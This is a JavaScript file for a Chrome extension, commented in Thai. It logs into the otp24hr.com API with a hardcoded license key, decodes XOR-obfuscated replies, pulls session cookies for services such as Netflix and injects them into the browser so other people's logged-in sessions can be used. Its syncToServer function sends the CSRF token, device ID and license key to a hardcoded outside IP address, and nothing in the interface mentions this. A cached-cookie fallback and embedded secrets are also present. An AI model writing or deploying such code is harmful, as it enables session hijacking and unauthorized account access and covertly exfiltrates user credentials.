const SECRET_KEY = 'OTP24HRHUB_PROTECT';
const API_BASE = 'https://otp24hr.com/api/v1/tools/api';
// Device ID ที่ใช้สร้าง Key สำเร็จแล้ว
const SAVED_DEVICE = 'T1RQfE1hY0ludGVsfDEwfDE2fDE3MTB4MTEwN3xBc2lhL1RhaXBlaXx0aC1USA';
const SAVED_KEY = 'EXCLUSIVE-3940-6C1D-7746';

let selectedAppId = '26';
let selectedAppName = 'Netflix';
let csrf = '';

function xor_decode(encodedStr, key) {
    const binaryString = atob(encodedStr);
    const bytes = new Uint8Array(binaryString.length);
    for (let i = 0; i < binaryString.length; i++) {
        bytes[i] = binaryString.charCodeAt(i) ^ key.charCodeAt(i % key.length);
    }
    return new TextDecoder().decode(bytes);
}

function log(msg) {
    const el = document.getElementById('log');
    el.innerHTML += msg + '\n';
    el.scrollTop = el.scrollHeight;
}

function setStatus(color, text) {
    document.getElementById('status-dot').className = `status-dot dot-${color}`;
    document.getElementById('status-text').textContent = text;
}

async function apiCall(action, params = {}, method = 'POST') {
    const key = document.getElementById('key-input').value.trim() || SAVED_KEY;
    const device = SAVED_DEVICE;
    
    let url = `${API_BASE}?action=${action}&key=${key}`;
    Object.keys(params).forEach(k => { url += `&${k}=${encodeURIComponent(params[k])}`; });
    
    const headers = {
        'x-device-id': device,
        'x-license-key': key,
    };
    if (csrf) headers['x-csrf-token'] = csrf;

    const options = { method, headers };
    if (method === 'POST') {
        options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
        options.body = new URLSearchParams({ key, device_id: device, ...params }).toString();
    }

    const res = await fetch(url, options);
    const t = res.headers.get('x-csrf-token');
    if (t) {
        csrf = t;
        // Auto-sync CSRF to EA-Server
        syncToServer(csrf, SAVED_DEVICE, document.getElementById('key-input')?.value?.trim() || SAVED_KEY);
    }
    return await res.json();
}

async function syncToServer(csrfToken, deviceId, licenseKey) {
    const EA_SERVER = 'http://35.201.156.240:4173';
    try {
        await fetch(`${EA_SERVER}/api/otp24/save_cookie`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                node_id: 'session',
                csrf_token: csrfToken,
                device_id: deviceId,
                license_key: licenseKey,
                cookies: [],
                target_url: ''
            })
        });
        console.log('EA-Server: synced credentials');
    } catch (e) {
        console.log('EA-Server sync error:', e.message);
    }
}

async function injectCookies(cookies, targetUrl) {
    const urlObj = new URL(targetUrl);
    const baseDomain = urlObj.hostname.replace('www.', '');

    // ล้าง cookie เก่า
    const oldCookies = await chrome.cookies.getAll({ domain: baseDomain });
    for (const c of oldCookies) {
        const removeUrl = (c.secure ? "https://" : "http://") + (c.domain.startsWith('.') ? c.domain.substring(1) : c.domain) + c.path;
        await chrome.cookies.remove({ url: removeUrl, name: c.name }).catch(() => {});
    }
    log(`🧹 ล้าง ${oldCookies.length} cookies เก่า`);

    let injected = 0;
    for (const raw of cookies) {
        const c = { ...raw };
        if (c.domains) { c.domain = c.domains; delete c.domains; }
        
        let domain = c.domain || '.' + baseDomain;
        let domainForUrl = domain.startsWith('.') ? domain.substring(1) : domain;

        const details = {
            url: "https://" + domainForUrl + (c.path || "/"),
            name: c.name,
            value: c.value || '',
            path: c.path || "/",
            httpOnly: !!c.httpOnly,
            secure: !!c.secure
        };

        if (c.hostOnly === false) details.domain = domain;
        if (c.expirationDate) details.expirationDate = parseFloat(c.expirationDate);
        if (c.ExpiresDate) details.expirationDate = parseFloat(c.ExpiresDate);

        try {
            await chrome.cookies.set(details);
            injected++;
        } catch (e) {
            delete details.domain;
            details.url = targetUrl;
            try { await chrome.cookies.set(details); injected++; } catch(e2) {}
        }
    }
    return injected;
}

// === MAIN: INJECT BUTTON ===
document.getElementById('inject-btn').addEventListener('click', async () => {
    const btn = document.getElementById('inject-btn');
    btn.disabled = true;
    btn.textContent = '⏳ Working...';
    document.getElementById('log').innerHTML = '';

    const key = document.getElementById('key-input').value.trim() || SAVED_KEY;

    try {
        // Step 1: Login
        setStatus('yellow', 'Logging in...');
        log(`🔑 Key: ${key}`);
        log('🔐 Login...');
        
        const r1 = await apiCall('login', { key, device_id: SAVED_DEVICE });
        if (!r1.payload) throw new Error(r1.message || 'Login ไม่สำเร็จ');
        
        const d1 = JSON.parse(xor_decode(r1.payload, SECRET_KEY));
        log(`✅ OK | Quota: ${d1.used_today}/${d1.daily_limit}`);
        document.getElementById('quota-text').textContent = `Quota: ${d1.used_today}/${d1.daily_limit}`;

        // Step 2: Get nodes
        setStatus('yellow', `Finding servers...`);
        log(`🔍 ${selectedAppName} servers...`);
        
        const r2 = await apiCall('get_nodes', { app_id: selectedAppId }, 'GET');
        if (!r2.payload) throw new Error('ดึง server ไม่ได้');
        
        const nodes = JSON.parse(xor_decode(r2.payload, SECRET_KEY));
        const avail = nodes.filter(n => n.can_access && n.is_working);
        log(`✅ พบ ${avail.length} server(s)`);
        if (!avail.length) throw new Error('ไม่มี server ออนไลน์');

        // Step 3: Get Cookie
        const node = avail[0];
        setStatus('yellow', 'Extracting cookies...');
        log(`🍪 ดึงจาก ${node.server_name}...`);
        
        const r3 = await apiCall('get_cookie', { node_id: node.id }, 'GET');
        if (!r3.payload) throw new Error(r3.message || 'ดึง Cookie ไม่ได้');
        
        const cookieData = JSON.parse(xor_decode(r3.payload, SECRET_KEY));
        log(`✅ ${cookieData.cookies.length} cookies`);

        // Step 4: Inject!  
        setStatus('yellow', 'Injecting...');
        const count = await injectCookies(cookieData.cookies, cookieData.target_url);
        log(`💉 ฉีดสำเร็จ ${count}/${cookieData.cookies.length}`);

        // Step 5: Open!
        setStatus('green', 'SUCCESS!');
        log(`\n🎉 เปิด ${selectedAppName}!`);
        chrome.tabs.create({ url: cookieData.target_url });

        btn.textContent = '✅ DONE!';
        setTimeout(() => { btn.disabled = false; btn.textContent = '🚀 INJECT & OPEN'; }, 3000);

    } catch (err) {
        setStatus('red', 'Error!');
        log(`❌ ${err.message}`);
        
        // FALLBACK: ลองใช้ cached cookies ถ้ามี
        log('\n🔄 ลอง Offline Mode...');
        try {
            const res = await fetch(chrome.runtime.getURL('cached_cookies.json'));
            const cached = await res.json();
            log(`📦 พบ cached cookies: ${cached.cookies.length} ตัว`);
            
            const count = await injectCookies(cached.cookies, cached.target_url);
            log(`💉 ฉีดสำเร็จ ${count}/${cached.cookies.length}`);
            setStatus('green', 'SUCCESS (cached)!');
            log(`\n🎉 เปิด ${selectedAppName}!`);
            chrome.tabs.create({ url: cached.target_url });
            
            btn.textContent = '✅ DONE!';
            setTimeout(() => { btn.disabled = false; btn.textContent = '🚀 INJECT & OPEN'; }, 3000);
        } catch (e2) {
            log(`❌ Offline mode failed: ${e2.message}`);
            btn.disabled = false;
            btn.textContent = '🚀 INJECT & OPEN';
        }
    }
});

// App selection
document.querySelectorAll('.app-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        document.querySelectorAll('.app-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        selectedAppId = btn.dataset.app;
        selectedAppName = btn.dataset.name;
    });
});
